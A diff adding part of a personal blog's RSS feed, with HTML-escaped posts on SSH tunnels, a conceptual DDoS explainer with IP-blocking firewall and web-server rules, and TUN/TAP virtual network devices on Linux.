+&lt;p&gt;A &lt;em&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Secure_Shell&#34;&gt;Secure Shell&lt;/a&gt; (SSH) tunnel&lt;/em&gt; consists of an encrypted tunnel created through an &lt;a href=&#34;https://en.wikipedia.org/wiki/Secure_Shell&#34;&gt;SSH protocol&lt;/a&gt; connection. Users may set up SSH tunnels to transfer &lt;a href=&#34;https://en.wikipedia.org/wiki/Unencrypted&#34;&gt;unencrypted&lt;/a&gt; traffic over a network through an &lt;a href=&#34;https://en.wikipedia.org/wiki/Encrypted&#34;&gt;encrypted&lt;/a&gt; channel. It is a software-based approach to network security and the result is transparent encryption.&lt;/p&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-ipsec/&#34;&gt;What is IPsec? | How IPsec VPNs work | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-tunneling/&#34;&gt;What is tunneling? | Tunneling in networking | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Tunneling_protocol&#34;&gt;Tunneling protocol&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-gre-tunneling/&#34;&gt;What is GRE tunneling? | How GRE protocol works | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>DDoS Attack</title>
+      <link>https://blog.jiyi27.com/posts/networking/004-ddos-attack/</link>
+      <pubDate>Sat, 09 Sep 2023 09:29:57 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/004-ddos-attack/</guid>
+      <description>&lt;h2 id=&#34;1-ddos-attack&#34;&gt;1. DDoS attack&lt;/h2&gt;
+&lt;p&gt;A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.&lt;/p&gt;
+&lt;p&gt;When a DDoS attack happens, a large volume of traffic is sent to a website. The site under attack typically crashes because the increased traffic exhausts the bandwidth limit or overloads the website’s servers.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-ddos-attack&#34;&gt;1. DDoS attack&lt;/h2&gt;
+&lt;p&gt;A distributed denial-of-service (DDoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic.&lt;/p&gt;
+&lt;p&gt;When a DDoS attack happens, a large volume of traffic is sent to a website. The site under attack typically crashes because the increased traffic exhausts the bandwidth limit or overloads the website’s servers.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&amp;quot;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&amp;quot;&amp;gt;
+  &amp;lt;iframe allow=&amp;quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&amp;quot; allowfullscreen=&amp;quot;allowfullscreen&amp;quot; loading=&amp;quot;eager&amp;quot; referrerpolicy=&amp;quot;strict-origin-when-cross-origin&amp;quot; src=&amp;quot;https://www.youtube.com/embed/7kB9-nQJR44?autoplay=0&amp;amp;amp;controls=1&amp;amp;amp;end=0&amp;amp;amp;loop=0&amp;amp;amp;mute=0&amp;amp;amp;start=0&amp;quot; style=&amp;quot;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&amp;quot; title=&amp;quot;YouTube video&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;video: &lt;a href=&#34;https://youtu.be/7kB9-nQJR44?si=R8qrLRhRwlqofAu5&#34;&gt;https://youtu.be/7kB9-nQJR44?si=R8qrLRhRwlqofAu5&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-how-does-a-ddos-attack-work&#34;&gt;2. How does a DDoS attack work?&lt;/h2&gt;
+&lt;p&gt;DDoS attacks are carried out with networks of Internet-connected machines.&lt;/p&gt;
+&lt;p&gt;These networks consist of computers and other devices (such as IoT devices)which have been infected with &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/malware/&#34;&gt;malware&lt;/a&gt;, allowing them to be controlled remotely by an attacker. These individual devices are referred to as &lt;a href=&#34;https://www.cloudflare.com/learning/bots/what-is-a-bot/&#34;&gt;bots&lt;/a&gt; (or zombies), and a group of bots is called a &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/what-is-a-ddos-botnet/&#34;&gt;botnet&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Once a botnet has been established, the attacker is able to direct an attack by sending remote instructions to each bot.&lt;/p&gt;
+&lt;p&gt;When a victim’s server or network is targeted by the botnet, each bot sends requests to the target’s &lt;a href=&#34;https://www.cloudflare.com/learning/dns/glossary/what-is-my-ip-address/&#34;&gt;IP address&lt;/a&gt;, potentially causing the server or network to become overwhelmed, resulting in a &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/denial-of-service/&#34;&gt;denial-of-service&lt;/a&gt; to normal traffic.&lt;/p&gt;
+&lt;p&gt;Because each bot is a legitimate Internet device, separating the attack traffic from normal traffic can be difficult.&lt;/p&gt;
+&lt;h2 id=&#34;3-how-to-identify-a-ddos-attack&#34;&gt;3. How to identify a DDoS attack&lt;/h2&gt;
+&lt;p&gt;The most obvious symptom of a DDoS attack is a site or service suddenly becoming slow or unavailable. But since a number of causes — such a legitimate spike in traffic — can create similar performance issues, further investigation is usually required. Traffic analytics tools can help you spot some of these telltale signs of a DDoS attack:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Suspicious amounts of traffic originating from a single IP address or IP range&lt;/li&gt;
+&lt;li&gt;A flood of traffic from users who share a single behavioral profile, such as device type, geolocation, or web browser version&lt;/li&gt;
+&lt;li&gt;An unexplained surge in requests to a single page or endpoint&lt;/li&gt;
+&lt;li&gt;Odd traffic patterns such as spikes at odd hours of the day or patterns that appear to be unnatural (e.g. a spike every 10 minutes)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;4-challenge-collapsar-cc-attack---ddos&#34;&gt;4. Challenge Collapsar (CC) attack - DDoS&lt;/h2&gt;
+&lt;p&gt;A Challenge Collapsar (CC) attack is an attack where standard HTTP requests are sent to a targeted web server frequently.&lt;/p&gt;
+&lt;p&gt;In 2004, a Chinese hacker nicknamed KiKi invented a hacking tool to send these kinds of requests to attack a NSFOCUS firewall named &lt;em&gt;Collapsar&lt;/em&gt;, and thus the hacking tool was known as &lt;em&gt;Challenge Collapsar&lt;/em&gt;, or &lt;em&gt;CC&lt;/em&gt; for short. Consequently, this type of attack got the name &lt;em&gt;CC attack&lt;/em&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;DDoS is not a specific attack, but a general term for a large types of attacks. There are dozens of types, and new attack methods are constantly being invented.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;41-intercept-cc-attack---intercept-http-request&#34;&gt;4.1. Intercept cc attack - intercept http request&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;(1) Hardware firewall&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Set a physical firewall before your server machine which used to filter request, this is best way but most expensive too.&lt;/p&gt;
+&lt;p&gt;**(2) Software firewall **&lt;/p&gt;
+&lt;p&gt;Almost all OS has firewall installed，Linux server usually use &lt;a href=&#34;https://wiki.archlinux.org/index.php/Iptables_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29&#34;&gt;iptables&lt;/a&gt;, intercept request from IP address  &lt;code&gt;1.2.3.4&lt;/code&gt;, for example:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ iptables -A INPUT -s 1.2.3.4 -j DROP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;(3) Web server&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Web can also used to intercept IP address &lt;code&gt;1.2.3.4&lt;/code&gt;, on nginx:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;location / {
+  deny 1.2.3.4;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On Apache, modify the  &lt;code&gt;.htaccess&lt;/code&gt; file:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;RequireAll&amp;gt;
+    Require all granted
+    Require not ip 1.2.3.4
+&amp;lt;/RequireAll&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Web server have a impact impact on the performance when used in firewall and cannot protect when there are huge DDoS attack.&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://www.ruanyifeng.com/blog/2018/06/ddos.html&#34;&gt;https://www.ruanyifeng.com/blog/2018/06/ddos.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/&#34;&gt;What is a distributed denial-of-service (DDoS) attack? | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/&#34;&gt;What is a distributed denial-of-service (DDoS) attack? | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Denial-of-service_attack&#34;&gt;Denial-of-service attack&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>TUN/TAP Devices</title>
+      <link>https://blog.jiyi27.com/posts/networking/007-tun-tap-device/</link>
+      <pubDate>Fri, 08 Sep 2023 17:54:59 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/007-tun-tap-device/</guid>
+      <description>&lt;h2 id=&#34;1-tuntap-devices&#34;&gt;1. TUN/TAP Devices&lt;/h2&gt;
+&lt;p&gt;In computer networking, &lt;strong&gt;TUN&lt;/strong&gt; and &lt;strong&gt;TAP&lt;/strong&gt; are two different kernel &lt;strong&gt;virtual network devices&lt;/strong&gt;. Though both are for tunneling purposes, TUN and TAP can&amp;rsquo;t be used together because they transmit and receive packets at different layers of the network stack. TUN (network TUNnel) devices are used for IP packet-level tunneling, while TAP (network TAP) devices are used for Ethernet frame-level tunneling.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A network interface can be a physical device, called network interface controller (NIC), such as an ethernet card or wireless adapter, or a virtual device, such as a TUN or TAP interface.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-tuntap-devices&#34;&gt;1. TUN/TAP Devices&lt;/h2&gt;
+&lt;p&gt;In computer networking, &lt;strong&gt;TUN&lt;/strong&gt; and &lt;strong&gt;TAP&lt;/strong&gt; are two different kernel &lt;strong&gt;virtual network devices&lt;/strong&gt;. Though both are for tunneling purposes, TUN and TAP can&amp;rsquo;t be used together because they transmit and receive packets at different layers of the network stack. TUN (network TUNnel) devices are used for IP packet-level tunneling, while TAP (network TAP) devices are used for Ethernet frame-level tunneling.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A network interface can be a physical device, called network interface controller (NIC), such as an ethernet card or wireless adapter, or a virtual device, such as a TUN or TAP interface.&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://www.baeldung.com/linux/create-check-network-interfaces&#34;&gt;https://www.baeldung.com/linux/create-check-network-interfaces&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;TUN/TAP provides packet reception and transmission for user space programs. It can be seen as a simple Point-to-Point or Ethernet device, which, instead of receiving packets from physical media, receives them from user space program and instead of sending packets via physical media writes them to the user space program. It interacts with user space program not the kernel.&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://docs.kernel.org/networking/tuntap.html&#34;&gt;https://docs.kernel.org/networking/tuntap.html&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;2-tuntap--network-stack&#34;&gt;2. TUN/TAP &amp;amp; Network Stack&lt;/h2&gt;
+&lt;p&gt;TUN/TAP is an operating-system interface for creating network interfaces managed by userspace. This is usually used to implement userspace Virtual Private Networks[&lt;a href=&#34;https://www.gabriel.urdhr.fr/2021/05/08/tuntap/#fn1&#34;&gt;1]&lt;/a&gt; (VPNs), for example with &lt;a href=&#34;https://openvpn.net/&#34;&gt;OpenVPN&lt;/a&gt;, &lt;a href=&#34;https://www.gabriel.urdhr.fr/2017/08/02/foo-over-ssh/#tuntap-forwarding&#34;&gt;OpenSSH&lt;/a&gt; (&lt;code&gt;Tunnel&lt;/code&gt; configuration or &lt;code&gt;-w&lt;/code&gt; argument), &lt;a href=&#34;https://code.ffdn.org/l2tpns/l2tpns&#34;&gt;l2tpns&lt;/a&gt;, etc.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+--------------------------------------------+
+| Processes                                  |
++--------------------------------------------+
+  ↕ Socket interface
++---------------------------------------------+
+| Network Stack (kernel)                      |&amp;lt;--+
++---------------------------------------------+   |
+  ↕ Eth. frame     ↕ Eth. frame    ↕ IP packet    |
++--------------+ +-------------+ +------------+   |
+| enp2s0       | | tap0        | | tun0       |   |
++--------------+ +-------------+ +------------+   |
+  ↑ Eth. frame     ↕ Eth. frame¹   ↕ IP packet¹   |
++--------------+ +-------------+ +------------+   |
+| Driver       | | Process     | | Process    |   |
++--------------+ +-------------+ +------------+   |
+  ↕ Eth. frame²    ↑               ↑              |
++--------------+   +---------------+--------------+
+| Eth. Adapter  |  (encapsulated packets)
++--------------+
+  ↕ Eth. frame
++--------------+
+| Eth. Network |
++--------------+
+Physical netdev    Ethernet VPN      IP VPN
+
+
+¹: via /dev/net/tun
+²: over PCI Express for example
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are many applications running on our OS (reside in user space), they send network packets with socket interface (on linux). All the packets through &lt;strong&gt;socket interface&lt;/strong&gt; will go to one place: the &lt;strong&gt;Network Stack&lt;/strong&gt; (resides in kernel). And the packets from the Network Stack only have two direction to go, one is the physical network interfce (&lt;strong&gt;NIC&lt;/strong&gt;), another direction is the virtual network devices &lt;strong&gt;tap/tun&lt;/strong&gt;, and we can get the packets from tap/tun which usually used in VPN application (resides in user space). Of course, VPN applicatipn (user space) can write packet into &lt;strong&gt;tap/tun&lt;/strong&gt; devices and after written into tap/tun the packet will goes to &lt;strong&gt;Network Stack&lt;/strong&gt;, and there are two direction again&amp;hellip;&lt;/p&gt;
+&lt;p&gt;You probably notice that if we use TUN/TAP devices to handle the packets from other normal  applications, the packet seem to go through the Network Stack twice: the normal applications write data into socket interface and these packets will go through Netwok Stack and intercepted by TUN/TAP devices, then after vpn handles these packets, these packet will be sent to Network Stack again, which probably not efficient. (Notice that in qemu-kvm, tap device works with bridge, and the packets goes to bridge directly without going through Network Stack which is more efficient)&lt;/p&gt;
+&lt;p&gt;Applications send or receive packet to/from socket interface:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; socket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;(AF_PACKET,SOCK_RAW,IPPROTO_IP)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;VPN application send or receive packet to/from tun devices:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Request a TUN device
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/net/tun&amp;#34;&lt;/span&gt;, O_RDWR);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// receives a (single) packet or frame from the virtual network interface;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Read an IP packet (because TUN works on IP layer):
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ssize_t&lt;/span&gt; count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;(fd, buffer, BUFFLEN);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// sends a (single) packet or frame to the virtual network interface;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;write&lt;/span&gt;(...) 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Source: &lt;a href=&#34;https://www.gabriel.urdhr.fr/2021/05/08/tuntap/&#34;&gt;TUN/TAP interface (on Linux) - /dev/posts/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-tun-vs-tap&#34;&gt;3. TUN vs. TAP&lt;/h2&gt;
+&lt;p&gt;There are two types of virtual network interfaces managed by &lt;code&gt;/dev/net/tun&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;TUN interfaces transport IP packets (layer 3);&lt;/li&gt;
+&lt;li&gt;TAP interfaces transport Ethernet frames (layer 2).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;31-tun-interfaces-l3&#34;&gt;3.1. TUN interfaces (L3)&lt;/h3&gt;
+&lt;p&gt;TUN interfaces (&lt;code&gt;IFF_TUN&lt;/code&gt;) transport layer 3 (L3) Protocol Data Units (PDUs):&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;in practice, it transports IPv4 and/or IPv6 packets;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;read()&lt;/code&gt; gets a L3 PDU (an IP packet);&lt;/li&gt;
+&lt;li&gt;you must &lt;code&gt;write()&lt;/code&gt; L3 PDUs (an IP packet);&lt;/li&gt;
+&lt;li&gt;there is no layer 2 (Ethernet, etc.) involved in the interface;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;32-tap-interfaces-l2&#34;&gt;3.2. TAP interfaces (L2)&lt;/h3&gt;
+&lt;p&gt;TAP interfaces (&lt;code&gt;IFF_TUN&lt;/code&gt;) transport layer 2 (L2) PDUs:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;in practice, it transports Ethernet frames (i.e. this is a virtual Ethernet adapter);&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;read()&lt;/code&gt; gets a L2 PDU;&lt;/li&gt;
+&lt;li&gt;you must &lt;code&gt;write()&lt;/code&gt; L2 PDUs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://www.gabriel.urdhr.fr/2021/05/08/tuntap/&#34;&gt;TUN/TAP interface (on Linux) - /dev/posts/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-set-up-tuntap-devices&#34;&gt;4. Set up TUN/TAP devices&lt;/h2&gt;
+&lt;p&gt;Because TUN is a layer 3 connection, it acts as a point-to-point link. We’ll assign these parameters:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;local address (for your machine): 192.0.2.1&lt;/li&gt;
+&lt;li&gt;remote address (for Scapy): 192.0.2.2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;On Linux, you would use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link set tun0 up
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip addr add 192.0.2.1 peer 192.0.2.2 dev tun0 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# sudo ip addr add 192.0.2.1 peer 192.0.2.2 dev tun0  up&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On BSD and macOS, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ifconfig tun0 up
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ifconfig tun0 192.0.2.1 192.0.2.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# sudo ifconfig tun0 192.0.2.1 192.0.2.2 up&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Source: &lt;a href=&#34;https://scapy.readthedocs.io/en/latest/layers/tuntap.html#tuntapinterface-reference&#34;&gt;https://scapy.readthedocs.io/en/latest/layers/tuntap.html#tuntapinterface-reference&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
